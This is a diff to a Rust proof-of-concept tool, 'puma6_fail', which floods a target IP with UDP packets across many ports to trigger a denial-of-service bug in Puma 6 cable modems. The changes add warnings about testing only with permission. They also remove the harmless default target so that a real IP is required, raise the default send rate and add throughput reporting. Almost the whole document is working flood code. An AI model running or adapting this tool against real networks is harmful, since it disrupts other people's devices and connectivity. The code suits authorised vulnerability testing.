@@ -1,3 +1,8 @@
+// This program is only for use in testing a puma 6 denial of service bug
+// Do not use this program without permission from the owner of the target IP
+// Attacking a system without permission is illegal in most countries
+// and also not very nice
+
 extern crate time;
 
 use std::env;
@@ -15,17 +20,18 @@ fn zeros(size: usize) -> Vec<u8> {
 
 fn main() {
 	let args: Vec<_> = env::args().collect();
-	// default to an unused address (entire /8 unused)
-	let mut target = "51.0.0.0";
+	let mut target = "0.0.0.0";
 	let mut length = 0usize;
-	let mut mbper_second = 0.5f32;
+	let mut mbper_second = 1f32;
 	let mut port_range = 50000;
 
 	println!("usage: ./puma6_fail <target ip={}> <payload length={}> <mbps={}> <ports={}>", target, length, mbper_second, port_range);
 
-	if args.len() > 1 {
-		target = args[1].as_str();
+	if args.len() <= 1 {
+		panic!("A target IP must be given");
 	}
+
+	target = args[1].as_str();
 
 	let source = UdpSocket::bind("0.0.0.0:10000").expect("couldn't bind to address");;
 	if args.len() > 2 {
@@ -46,13 +52,18 @@ fn main() {
 	let udp_length = length + 28;
 	let ethernet_length = udp_length + 26;
 	let packets_per_millisecond = (per_second / (udp_length as f32))/1000f32;
-	println!("Sending {} UDP pps, {} bytes payload, {} bytes IP, {} bytes ethernet, to {} ports at {}", packets_per_millisecond*1000f32, length, udp_length, ethernet_length, port_range, target);
+	let pps = packets_per_millisecond*1000f32;
+	println!("Sending {} UDP pps, {} bytes payload, {} bytes IP, {} bytes ethernet, to {} ports at {}", pps, length, udp_length, ethernet_length, port_range, target);
+	println!("mbps IP traffic: {}, mbps ethernet traffic: {}", pps*(udp_length as f32)/(1024f32*1024f32/8f32), pps*(ethernet_length as f32)/(1024f32*1024f32/8f32));
 
 	let start = time::PreciseTime::now();
 	let mut count = 0;
 	loop {
 		for port in 10000..(10000 + port_range) {
-			source.send_to(&data, format!("{}:{}", target, port)).ok();
+			let result = source.send_to(&data, format!("{}:{}", target, port));
+			if result.is_err() {
+				println!("Failed to send packet. {}", result.unwrap_err());
+			}
 			count = count + 1;
 			let elapsed = start.to(time::PreciseTime::now()).num_milliseconds();
 			if count as f32 / packets_per_millisecond > (elapsed as f32) {
